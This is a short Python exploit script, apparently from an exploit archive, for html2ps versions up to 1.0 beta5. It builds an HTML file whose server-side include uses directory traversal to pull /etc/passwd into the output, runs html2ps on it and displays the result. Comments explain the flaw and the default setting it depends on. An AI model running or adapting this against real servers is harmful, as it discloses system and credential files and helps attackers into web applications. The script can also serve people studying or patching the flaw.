#!/usr/bin/env python
#
# html2ps <= 1.0 beta5 arbitrary file disclosure
# http://user.it.uu.se/~jan/html2ps.html
# author: epiphant <epiphant.0@gmail.com>
#
# the "include file" ssi directive doesn't check for directory
# traversal so you can include and disclose any file in the
# dir tree (very handy when html2ps is running as a part of a
# web app with data that you control)
# the vuln requires that "ssi" in the @html2ps block in the
# html2psrc file is set to 1, which is the default
#
# bonus info: some of the backtick operators look shady too
# but will require lots of prerequisites so they're uncool
#
# shouts: thcx labs, zybadawg333, fabiodds, str0ke
# jan k: shame on you - your perl is very ugly
#

import os

d = """\
<html>
<head>
<title>epiphant</title>
</head>
<body>
<h1>epiphant</h1>
<!--#include file="../../../../../../../etc/passwd"-->
<p>epiphant</p>
</body>
</html>
"""

try:
  fi = open("epiphant.html", "w")
  fi.write(d)
  fi.close()
except:
  print "can't write here"
  exit(1)

os.system("html2ps epiphant.html > epiphant.ps")
os.system("gv epiphant.ps")
exit(0)